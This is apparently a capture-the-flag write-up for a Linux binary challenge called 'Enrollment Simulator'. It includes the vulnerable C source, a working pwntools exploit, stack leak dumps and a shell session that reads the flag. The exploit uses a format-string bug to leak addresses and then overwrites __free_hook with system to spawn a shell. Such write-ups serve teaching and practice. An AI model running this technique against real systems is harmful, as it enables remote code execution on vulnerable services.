# Enrollment Simulator
Author:650  
Binary  
Description  
Solves 1  

Have you ever experience the joy from the enrollment of COMP2633? Do you want to relive such joy? Let me introduce to you, the one and only, COMP2633 ENROLLMENT SIMULATOR!!!!!!  

[Enrollment simulator](./program)

[Source](https://files.firebird.sh/chal-2024/08/enrollment_simulator.c)

`nc chal.firebird.sh 35042`

## Solution
```py
from pwn import * 
binary = "./program_patched"

p = process(binary)
p = remote("chal.firebird.sh", 35042)
elf = ELF(binary)
libc = ELF('./libc.so.6')
s = '''
b* enrollment_simulator+218
'''
#gdb.attach(p, s)

# First interaction - input email and reason
p.sendlineafter(b"6. Quit", b'1')
p.sendlineafter(b"ITSC email:", b'dummy')
p.sendlineafter(b"late enrollment:", b"%27$p")


# Second interaction - view the info
p.sendlineafter(b"6. Quit", b'4')
p.recvuntil(b"0x")


main_addr = b'0x' + p.recvuntil(b"W", drop = True) #b'0x561d57871532'
main_addr = int(main_addr.decode(), 16) #decode and convert to int with base 16 
#print(hex(main_addr))


elf.address = main_addr - 0x1532

puts_entry = elf.got['puts']

#print(hex(puts_entry))
p.sendlineafter(b"6. Quit", b'1')
p.sendlineafter(b"ITSC email:", p64(puts_entry)) # put GOT entry address to a stack variable 
p.sendlineafter(b"late enrollment:", b"%8$sAAAA") # dereferences to GOT entry address 

p.sendlineafter(b"6. Quit", b'4')
p.recvuntil(b"Reason for late enrollment:\n")
GOT_leak = int.from_bytes(p.recvuntil(b"A", drop = True), 'little')

libc.address = GOT_leak - libc.sym['puts']

#print(hex(GOT_leak))
#print(hex(libc.address))

# examples 
# 0x7f1ca5c6de48, 0x7fbfea69ae48
# 0x7f1ca5ad1290, 0x7fbfea4fe290
free_hook_addr = libc.sym['__free_hook']
sys_addr = libc.sym['system']
print(hex(free_hook_addr))
print(hex(sys_addr))
#payload = fmtstr_payload(8, {libc.sym['__free_hook'] : libc.sym['system']}) doesn't work 

for i in range(6):
    if i == 0:
        format_specifiers = b'%144c%8$hhn' # writes 90 at the ending byte
    else:
        bytes = (sys_addr >> i * 8) & 0xff
        format_specifiers = f'%{bytes}c%8$hhn'.encode()

    address_payload = free_hook_addr + i

    p.sendlineafter(b"6. Quit", b'1')
    p.sendlineafter(b"ITSC email:", p64(address_payload))
    p.sendlineafter(b"late enrollment:", format_specifiers) # now buffer also at %7$p

    p.sendlineafter(b"6. Quit", b'4')
    p.recvuntil(b"Reason for late enrollment:\n")

# "/bin/sh", as 1st argument, goes to  __free_hook which has been overwritten as system
p.sendlineafter(b"6. Quit", b'1')
p.sendlineafter(b"ITSC email:", b'dummy')
p.sendlineafter(b"late enrollment:", b"/bin/sh")
p.sendlineafter(b"6. Quit", b'5')

p.interactive()
```
Uncomment the lin ethat connects to the remote and run the above solve script, you get a shell and therefore the flag! 

## Obversations 
### Security
```
┌──(kali㉿kali)-[~/Desktop/CTF/enrollment]
└─$ checksec program                                                                  
[*] '/home/kali/Desktop/CTF/enrollment/program'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
- `Full RELRO`: libc addresses are loaded at the beginning of the function and made read-only. Therefore, they we can hardly perform GOT hijacking to rewrite the libc addresses. But there's an exception for this i.e. `__free_hook` used for the `free()` function used to free dynamically allocated variable in the program. 
- `Canary found`: Obstacle for buffer overflow, this protection is useless for our format string attack as we are not overflowing anything to attack. 
- `NX enabled`: That means there is no section that is both writable and executable, which mean no shellcode injecting and executing. Therefore, we got to somehow call `system` with `/bin/sh` to get a shell 
- `PIE enabled`: The addresses of `.text`, `.bss` and `.data` section are randomized and to defeat it to make use of arbirary addresses of a particular section, we need to leak the address of that section and calculate the runtime base address with known offsets.

### Source code 
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void readInput(char *buf,int len){
    int numb = read(0, buf, len-1);
    buf[numb] = 0;
    if (buf[numb - 1] == '\n') {
        buf[numb - 1] = 0;
    }
}

int prompt(){
    int opt;
    puts("What would you like to do?");
    puts("1. Enroll in COMP2633");
    puts("2. Enroll in 2633");
    puts("3. Enroll in Competitive Programming in Cybersecurity I");
    puts("4. View my current enrollment application");
    puts("5. Submit my enrollment application");
    puts("6. Quit");
    scanf("%d", &opt);
    return opt;
}

char* initReasonBuf(){
    char *reasonBuf = malloc(0x100);
    for (int i=0;i<0x100;i++){
        reasonBuf[i] = '\0';
    }
    return reasonBuf;
}

void enrollment_simulator(){
    char email[0x50];
    for (int i = 0;i < 0x50;i++){
        email[i] = '\0';
    }
    char* reasonBuf = initReasonBuf();
    puts("Welcome to the enrollment simulator!");
    while (1){
        int option = prompt();
        switch (option) {
            case 1:
            case 2:
            case 3:
                puts("Please enter your ITSC email:"); 
                // this is just a CTF challenge, you don't need to input your real email
                readInput(email, 0x50);
                puts("Since the Add-Drop period has passed, you need you provide special reason for late enrollment:");
                readInput(reasonBuf, 0x100);
                break;
            case 4:                             
                printf("Email: %s\n",email); 
                printf("Reason for late enrollment:\n");
                printf(reasonBuf);
                break;
            case 5:
                puts("Your application will be reviewed and processed, bye");
                free(reasonBuf);
                exit(1);
                break;
            case 6:
                puts("Are you sure you want to quit without enrolling in any of the available courses? (y/n)");
                getchar();
                if (getchar() == 'y'){
                    puts("QAQ");
                    exit(1);
                } else {
                    puts("Please enroll in COMP2633 UwU");
                }
                break;
                
        }
    }

}


int main(){
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    enrollment_simulator();
}
```
There are some lines in the program's source which reveals the some vulnerability which we can exploit. For example,   
```c
printf("Email: %s\n",email); 
printf("Reason for late enrollment:\n");
printf(reasonBuf);
```
- `printf("Email: %s\n",email);`: Helps us to dereference what's in email and print that out for us.
- `printf(reasonBuf);`: prints out the content of `reasonBuf` directly. Therefore, we can input some format strings like a bunch of `%p` to inspect the stack of the program **above** `reasonBuf`.  
For example, we can use it to output the address of `email` variable which is nearby
```
   0x000055af0b9bd463 <+167>:   lea    rax,[rbp-0x60]
   0x000055af0b9bd467 <+171>:   mov    esi,0x50
   0x000055af0b9bd46c <+176>:   mov    rdi,rax
   0x000055af0b9bd46f <+179>:   call   0x55af0b9bd269 <readInput>
   0x000055af0b9bd474 <+184>:   lea    rdi,[rip+0xcb5]        # 0x55af0b9be130
   0x000055af0b9bd47b <+191>:   call   0x55af0b9bd0f0 <puts@plt>
   0x000055af0b9bd480 <+196>:   mov    rax,QWORD PTR [rbp-0x68]
   0x000055af0b9bd484 <+200>:   mov    esi,0x100
   0x000055af0b9bd489 <+205>:   mov    rdi,rax
   0x000055af0b9bd48c <+208>:   call   0x55af0b9bd269 <readInput>
```
Here `rbp-0x68` is `reasonBuf` and `rbp-0x60` is `email`, they are identifiable because input function `readInput` was used in the source with `0x100` and `0x50` bytes of input size respectively. For example, with `p.sendlineafter(b"late enrollment:", b"%p \n" * 0x20)` in our python script, output would be somewhat like the following:    
```
[*] Switching to interactive mode
7f3cbc11c723 
(nil) 
0x7f3cbc03d297 
0x1c 
0xd 
0x400000050 
0x55a2c78932a0 
0x796d6d7564 
(nil) 
(nil) 
(nil) 
(nil) 
(nil) 
(nil) 
(nil) 
(nil) 
(nil) 
0x55a2c6f4e180 
0xfd163a675f837100 
0x7ffeb9a14110 
0x55a2c6f4e59e 
(nil) 
0x7f3cbbf53083 
0x7f3cbc152620 
0x7ffeb9a14208 
0x100000000 
0x55a2c6f4e532 
0x55a2c6f4e5b0 
0x9445bfec4b4b384f 
0x55a2c6f4e180 
0x7ffeb9a14200 
(nil)
```
which leaks a bunch of quite important addresses. For example,  
- `0x55a2c78932a0` is `reasonBuf`'s heap address. And yes, `reasonBuf` is dynamically allocated iwth `malloc` which can be observed from the source code as well. The content of `reasonBuf` i.e. our format string attack input, is going to be stored in heap, not on stack. Only the heap address `0x55a2c78932a0` would be on stack. Like a door to another world.
- `0x796d6d7564` is `email` 
```
02:0010│-060 0x7fffc336bc80 ◂— 0x796d6d7564 /* 'dummy' */ (dummy is what I put in)
```
- `0x55a2c6f4e532` is the runtime address of `main`, we can tell from its ending `532` because it is the offset of `main` from program base. We know this from objdump
```
0000000000001532 <main>:
1532:	f3 0f 1e fa          	endbr64
1536:	55                   	push   rbp
```
And that's it, these information is pretty much for our attack!

## Attack 
Here is the attack flow:
- leak `.text` address (i.e. instruction, code addresses) to leak runtime base address
- leak libc address to leak the libc version 
- calculate `system` address and overwrite __free_hook with that 

### Leak `.text` addresses
First, we leak the `main` address to defeat `PIE`.  
To do so, we can make use of `p.sendlineafter(b"late enrollment:", b"%p \n" * 0x20)` and look around for address ending with `main`'s offset i.e. `0000000000001532`. Therefore, I see stuff ending with `532` and I counted until that e.g. `0x55a2c6f4e532`  
Again let's look at the output:  
```
[*] Switching to interactive mode
7f3cbc11c723 
(nil) 
0x7f3cbc03d297 
0x1c 
0xd 
0x400000050 
0x55a2c78932a0 
0x796d6d7564 
(nil) 
(nil) 
(nil) 
(nil) 
(nil) 
(nil) 
(nil) 
(nil) 
(nil) 
0x55a2c6f4e180 
0xfd163a675f837100 
0x7ffeb9a14110 
0x55a2c6f4e59e 
(nil) 
0x7f3cbbf53083 
0x7f3cbc152620 
0x7ffeb9a14208 
0x100000000 
0x55a2c6f4e532 
0x55a2c6f4e5b0 
0x9445bfec4b4b384f 
0x55a2c6f4e180 
0x7ffeb9a14200 
(nil)
``` 
In the case of the challenge, the runtime address of `main` would be at the 27th location of the output of `p.sendlineafter(b"late enrollment:", b"%p \n" * 0x20)`. Therefore, `%27$p` would be able to get it.   
Be aware that with different libc version, the positioning of those addresses on the stack could be a bit different. For example, my first try was done locally before getting correct libc, `main` address was at the 25th position which `%27$p` would have to used to get it. So in order to leak them correctly before having the right libc version downloaded, we have to connect to the remote first and print things out with `%p` to leak correctly.   

Once we get a `.text`, like `main` address, all we need to do is to calculate the base address in `PIE` enabled program by subtracting the corresponding offset of `main` from the base i.e., again just `0001532` in this case

### Leak libc address
To get the correct libc version as the remote, we need to leak the runtime addresses and thus the offset of common libc functions which are recorded on online databases that could show the corresponding libc version of those function offsets.  
For example, we can always get the correct libc version by leaking `printf`, `puts` and `read`.

To leak them in the context of the challenge, we use format string. But, how?  
Remember that `email` is right next to the heap entry address of `reasonBuf` on the stack, we can make use of `email` to store the GOT entry addresses of the libc functions, then we use `%s` to dereference and print the content out.   

There is the traditional method of doing something like 
```c
printf("%9$sAAAA\x30\xdd\xff\xff\xff\x7f\x00\x00");
```
after figuring output through the pack `%p` that `AAAA` is at the 8th position.   

This method stores the next 8 bytes i.e. `\x30\xdd\xff\xff\xff\x7f\x00\x00` to the next position of `AAAA`, which is on stack. The reason why this is not going to work is because `reasonBuf` is on heap, which the address that we put into the next position, would also be stored in heap. For example,  
```
pwndbg> x/32gx 0x55a9d9a0e2a0
0x55a9d9a0e2a0: 0x4141732541414141      0x000055a9c599ff90
0x55a9d9a0e2b0: 0x0000000a20700000      0x0000000000000000
0x55a9d9a0e2c0: 0x0000000000000000      0x0000000000000000
0x55a9d9a0e2d0: 0x0000000000000000      0x0000000000000000
0x55a9d9a0e2e0: 0x0000000000000000      0x0000000000000000
0x55a9d9a0e2f0: 0x0000000000000000      0x0000000000000000
0x55a9d9a0e300: 0x0000000000000000      0x0000000000000000
0x55a9d9a0e310: 0x0000000000000000      0x0000000000000000
0x55a9d9a0e320: 0x0000000000000000      0x0000000000000000
0x55a9d9a0e330: 0x0000000000000000      0x0000000000000000
0x55a9d9a0e340: 0x0000000000000000      0x0000000000000000
0x55a9d9a0e350: 0x0000000000000000      0x0000000000000000
0x55a9d9a0e360: 0x0000000000000000      0x0000000000000000
0x55a9d9a0e370: 0x0000000000000000      0x0000000000000000
0x55a9d9a0e380: 0x0000000000000000      0x0000000000000000
0x55a9d9a0e390: 0x0000000000000000      0x0000000000000000
pwndbg> x/gx 0x000055a9c599ff90
0x55a9c599ff90 <puts@got.plt>:  0x00007f162e693760
```
Above was my example of doing something like 
```c
printf("%9$sAAAA" + p64(elf.got(puts)));
```
But in this case, the GOT entry address get puts on the next position of `AAAA` on the heap:
`0x55a9d9a0e2a0: 0x4141732541414141      0x000055a9c599ff90`   
And I could not find any ways to dereference it and get the actual runtime libc address
```
pwndbg> x/gx 0x000055a9c599ff90
0x55a9c599ff90 <puts@got.plt>:  0x00007f162e693760
```

Therefore, the correct way, at least I believe, one of the correct way to leak libc address is to put the GOT entry addresses e.g. `0x000055a9c599ff90` on the stack using `email`, which would be right next to the heap address of `reasonBuf` at the 7th position.   
Even if it is not right next to it, as long as we know the offset from the heap address to where our GOT entry addresses are stored on the stack, we are able to to get the value we want by derefernecing it with `%s`.    

You may also ask, why can't we just pass the GOT entry address into `email` to dereference it?
That is because `email` is a variable on the stack, if we input the GOT entry address into the email variable, we are doing something 
```c
email = p64(elf.got(puts))
printf("Email: %s\n",email); 
```
then `%s` would just dereference that particular `email` variable of the stack  
### Overwriting __free_hook 
To overwrite `__free_hook`, we do it the same way as how we dereference and read content of something while we leak the libc address.   
The difference is just that this time, we are putting the stuff that we wish to overwrite into the `email` variable. Then we overwrite with `$hhn` format specifier that is stored in `reasonBuf` on the heap!  
Here is an example,  
```py
format_specifiers = b'%144c%8$hhn' # 0x90

address_payload = free_hook_addr # starts writing at the very last bytes of __free_hook

p.sendlineafter(b"6. Quit", b'1')
p.sendlineafter(b"ITSC email:", p64(address_payload)) # store it on stack first, in email at %8$p!
p.sendlineafter(b"late enrollment:", format_specifiers) # %7$p would be format specifiers %144c%8$hhn that writes 0x90


p.sendlineafter(b"6. Quit", b'4')
p.recvuntil(b"Reason for late enrollment:\n")



bytes = (sys_addr >> 8) & 0xff # the second last byte of system address during the runtime 
format_specifiers = f'%{bytes}c%8$hhn'.encode() # format the format specifiers
#print(bytes)
address_payload = free_hook_addr + 1 # the second last byte of __free_hook


p.sendlineafter(b"6. Quit", b'1')
p.sendlineafter(b"ITSC email:", p64(address_payload))
p.sendlineafter(b"late enrollment:", format_specifiers) # now buffer also at %7$p


p.sendlineafter(b"6. Quit", b'4')
p.recvuntil(b"Reason for late enrollment:\n")


# and so on... 
```

With that in mind, we can use a loop to write the entire `__free_hook` address to `system`:  
```py
for i in range(6):
    if i == 0:
        format_specifiers = b'%144c%8$hhn' # writes 90 at the ending byte
    else:
        bytes = (sys_addr >> i * 8) & 0xff
        format_specifiers = f'%{bytes}c%8$hhn'.encode()

    address_payload = free_hook_addr + i

    p.sendlineafter(b"6. Quit", b'1')
    p.sendlineafter(b"ITSC email:", p64(address_payload))
    p.sendlineafter(b"late enrollment:", format_specifiers) # now buffer also at %7$p

    p.sendlineafter(b"6. Quit", b'4')
    p.recvuntil(b"Reason for late enrollment:\n")
```

And lastly, we can easily pass in `/bin/sh` to `_free_hook` aka `system` by choosing option `1` and then option `5` where `free(reasonBuf)` was located, to call it and get the shell! 

```
┌──(kali㉿kali)-[~/Desktop/CTF/enrollment]
└─$ python solve3.py
[+] Starting local process './program_patched': pid 43251
[+] Opening connection to chal.firebird.sh on port 35042: Done
[*] '/home/kali/Desktop/CTF/enrollment/program_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] '/home/kali/Desktop/CTF/enrollment/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
0x7f1a0ca70e48
0x7f1a0c8d4290
[*] Switching to interactive mode

Your application will be reviewed and processed, bye
$ ls
enrollment_simulator
flag.txt
$ cat flag.txt
flag{C0MPZ633_15_aN_aMA21Ng_c0ur53_uwu}$ 
```
